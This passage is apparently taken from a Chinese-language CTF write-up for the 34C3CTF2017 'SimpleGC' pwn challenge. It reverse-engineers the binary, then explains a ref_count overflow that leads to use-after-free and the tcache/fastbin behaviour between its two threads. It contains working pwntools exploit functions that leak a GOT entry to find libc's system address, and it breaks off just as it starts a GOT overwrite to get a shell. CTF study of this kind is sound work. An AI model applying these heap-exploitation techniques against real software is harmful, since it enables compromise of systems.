@@ -1,0 +1,192 @@
+| 0x00401139 push rbp
+| 0x0040113a mov rbp, rsp
+| 0x0040113d sub rsp, 0x20
+| 0x00401141 mov qword [local_18h], rdi
+; [local_18h] 赋值为传入的 group
+| 0x00401145 mov word [local_2h], 0
+; 循环计数 i，初始化为 0
+| ,= 0x0040114d movzx eax, word [local_2h]
+| :| 0x00401151 cdqe
+| :| 0x00401153 mov rax, qword [rax*8 + 0x6023e0]
+; [0x6023e0:8]=0 ; 取出 groups[i]
+| :| 0x0040115b test rax, rax
+| ,===group_name
+| |:| 0x00401171 mov rax, qword [local_18h]
+; 取出传入的 group
+| |:| 0x00401175 mov rsi, rdx
+| |:| 0x00401178 mov rdi, rax
+| |:| 0x0040117b call sym.imp.strcmp
+; 进行比较
+| |:| 0x00401180 test eax, eax
+| ,====ref_count
+| ||:| 0x00401196 test al, al
+| ,=====ref_count
+| |||:| 0x004011ac sub edx, 1
+; 将 ref_count 减 1
+| |||:| 0x004011af mov byte [rax + 8], dl
+; 将低字节放回
+| ,====== 0x004011b4 nop
+| ||| :| ; JMP XREF from 0x00401182 (sub.strcmp_139)
+| ||| :| ; JMP XREF from 0x00401198 (sub.strcmp_139)
+| ||| :| ; JMP XREF from 0x004011b2 (sub.strcmp_139)
+| ```----> 0x004011b5 add word [local_2h], 1
+; 循环计数 + 1
+| :| ; JMP XREF from 0x0040114b (sub.strcmp_139)
+| :`-> 0x004011ba cmp word [local_2h], 0x5f
+; [0x5f:2]=0xffff ; '_' ; 95
+| `==ref_count 减 1。这里有个问题，正如我们在 edit-a-group 分析的，通过修改
+group，可能使 groups 中存在两个同名的 group，那么根据这里的逻辑，这两个同
+名的 group 的 ref_count 都会被减去 1，可能导致 UAF 漏洞。
+1134
+6.1.15 pwn 34C3CTF2017 SimpleGC
+然后是删除 user 的过程中，只释放了 user 本身和 user->group，而 user->name
+没有被释放。可能导致信息泄漏。
+漏洞利用
+逆向分析完成，来简单地总结一下。
+两个结构体和两个由结构体指针构成的数组：
+struct group {
+char *group_name;
+uint8_t ref_count;
+} group;
+struct user {
+uint8_t age;
+char *name;
+char *group;
+} user;
+struct user *users[0x60]; // 0x6020e0
+struct group *groups[0x60]; // 0x6023e0
+添加 user 时将创建 user 结构体，name 字符串两个 chunk
+新建 group 时将创建 group 结构体，group_name 字符串两个 chunk
+group 本身和 group->group_name 由 GC 线程来释放
+user 在删除时释放了 user 本身，group->ref_count 减 1，而 user->name 将导
+致信息泄漏
+ref_count 类型为 uint8_t 且在修改组是不会减 1，将导致溢出（例如：0x100
+和 0x0），使 GC 进行释放 group 的操作
+如果有两个同名的 group，两个 user 分别指向这两个 group，那么释放其中一
+个 user 时，另一个也会被释放，造成 UAF
+然后是关于 tcache 的问题。在这个程序中有两个线程，thread-1 为主线程，
+thread-2 为 GC 线程，它们都有自己的 tcache。程序中所有 chunk 的分配工作都
+由 thread-1 执行，thread-2 只释放（group和group_name）不分配，所以在它的
+1135
+6.1.15 pwn 34C3CTF2017 SimpleGC
+tcache bins 被装满以后所有该线程释放的 fast chunk 都被放进 fastbins 中。而
+fastbins 是进程公用的，所以会被主线程在分配时使用。
+第一种方法，我们利用 ref_count 溢出的 UAF。
+overflow
+首先我们来溢出 ref_count：
+def overflow():
+sleep(1)
+for i in range(0x100-1):
+add_user('a'*8, 'A'*4)
+edit_group(0, 'n', 'B'*4)
+delete_user(0)
+add_user('a'*8, 'A'*4) # overflow ref_count
+sleep(2) # group_name and group freed by GC
+首先说一下 for 循环，前几次当 thread-2 的 tcache 还未装满时，它的操作和下面
+类似（顺序可能不同）：
+user: malloc(24)=0x6033c0  thread-1 tcache
+group_name: free(0x6034c0) => thread-2 tcache
+group: free(0x6034e0) => thread-2 tcache
+当 thread-2 tcache 装满时，它释放的 chunk 都会被放进 fastbins，于是就可以被
+thread-1 取出，下面是第 4 和 第 5 次循环：
+1136
+6.1.15 pwn 34C3CTF2017 SimpleGC
+user: malloc(24)=0x6033c0  thread-1 tcache
+group_name: free(0x603520) => thread-2 tcache
+group: free(0x603540) => fastbin
+user: malloc(24)=0x6033c0  thread-1 tcache
+group_name: free(0x603560) => fastbin
+group: free(0x603580) => fastbin
+此时的 thread-1 tcache 和 fastbin 如下所示：
+tcache: 0x6033c0
+fastbin: 0x603560 -> 0x603580
+于是第 6 次循环，在第一次从 fastbin 中取出 chunk 后，剩余的 chunk 会被放入
+thread-1 tcache（逆序），然后再从 tcache 里取（FILO）：
+1137
+6.1.15 pwn 34C3CTF2017 SimpleGC
+user: malloc(24)=0x6033c0  tcache
+group_name: free(0x603560) => fastbin
+group: free(0x6035a0) => fastbin
+再往后，其实都是重复这个过程。循环结束时的状态为：
+gdb-peda$ x/4gx 0x6020e0
+0x6020e0: 0x0000000000000000 0x0000000000000000
+ 0x6054c0
+紧接着我们再添加一个 user，导致 ref_count 溢出为 0x100 后，程序只有只有将
+低位的 0x00 放回 ref_count ，于是 GC 会将 group_name 和 group struct 依
+次释放，放进 fastbin。
+1138
+6.1.15 pwn 34C3CTF2017 SimpleGC
+user: malloc(24)=0x6033c0  fastbin (tcache: 0x603560 ;
+fastbin: 0x603380)
+fake group: free(0x6033a0) => fastbin (tcache: 0x603560 ;
+fastbin: 0x603380 -> 0x6033a0)
+group_name: malloc(24)=0x603560  0x6033a0)
+group: malloc(16)=0x6033a0 group
+gdb-peda$ x/2gx 0x603380
+0x603380: 0x0000000000000000 0x0000000000000000
+group 依然指向 group_name （ 0x603380 ），悬指针产生。
+uaf and leak
+1139
+6.1.15 pwn 34C3CTF2017 SimpleGC
+接下来利用悬指针泄漏 libc 的地址：
+def leak():
+add_user('b'*8, 'B'*4) # group
+strlen_got = elf.got['strlen']
+edit_group(0, "y", p64(0)+p64(strlen_got)+p64(strlen_got))
+__strlen_sse2_addr = u64(display_user(1)[13:19].ljust(8, '\0'
+))
+libc_base = __strlen_sse2_addr - 0xa83f0
+system_addr = libc_base + libc.symbols['system']
+log.info("__strlen_sse2 address: 0x%x" % __strlen_sse2_addr)
+log.info("libc base: 0x%x" % libc_base)
+log.info("system address: 0x%x" % system_addr)
+return system_addr
+在执行该函数前的 tcache 如下：
+tcache: 0x603380
+当我们添加一个 user 时，因为 group "BBBB" 不存在，所以首先创建一个 group，
+然后再创建 user，这个 user struct 将从 thread-1 tcache 中取出。接下来我们修改
+user[0]->group 就是修改 user[1]。我们将 strlen@got 写进去，在延迟绑定之后，
+它将指向 strlen 函数的地址，如下所示：
+1140
+6.1.15 pwn 34C3CTF2017 SimpleGC
+gdb-peda$ x/4gx 0x6020e0
+0x6020e0: 0x00000000006033c0 0x0000000000603380
+group
+接下来只要 display users[1]，就可以将 strlen 的地址打印出来，然而：
+gdb-peda$ x/gx 0x602030
+0x602030: 0x00007ffff7aa03f0
+gdb-peda$ disassemble strlen
+Dump of assembler code for function strlen:
+0x00007ffff7a8bee0 : mov rax,QWORD PTR [rip+0x345f
+71] # 0x7ffff7dd1e58
+0x00007ffff7a8bee7 : lea rdx,[rip+0xea982]
+# 0x7ffff7b76870 
+0x00007ffff7a8beee : mov eax,DWORD PTR [rax+0xa8]
+0x00007ffff7a8bef4 : and eax,0x20c00
+0x00007ffff7a8bef9 : cmp eax,0xc00
+0x00007ffff7a8befe : lea rax,[rip+0x144eb]
+# 0x7ffff7aa03f0 
+0x00007ffff7a8bf05 : cmove rax,rdx
+0x00007ffff7a8bf09 : ret
+End of assembler dump.
+1141
+6.1.15 pwn 34C3CTF2017 SimpleGC
+strlen@got 指向的并不是 strlen 函数，而是它里面的 __strlen_sse2 ，这就很
+奇怪了。原因出在这次 commit。libc-2.26 中使用了 AVX2 对 strlen 系列函数进行
+优化。
+那我们修改一下，反正计算偏移的方法是相同的：
+gdb-peda$ vmmap libc
+Start End Perm Name
+0x00007ffff79f8000 0x00007ffff7bce000 r-xp /home/firmy/Simp
+leGC/libc-2.26.so
+0x00007ffff7bce000 0x00007ffff7dce000 ---p /home/firmy/Simp
+leGC/libc-2.26.so
+0x00007ffff7dce000 0x00007ffff7dd2000 r--p /home/firmy/Simp
+leGC/libc-2.26.so
+0x00007ffff7dd2000 0x00007ffff7dd4000 rw-p /home/firmy/Simp
+leGC/libc-2.26.so
+gdb-peda$ p 0x7ffff7aa03f0 - 0x00007ffff79f8000
+$2 = 0xa83f0
+然而就得到了 system 的地址。
+get shell
+最后只需要修改 strlen@got 为 system@got 就可以了：
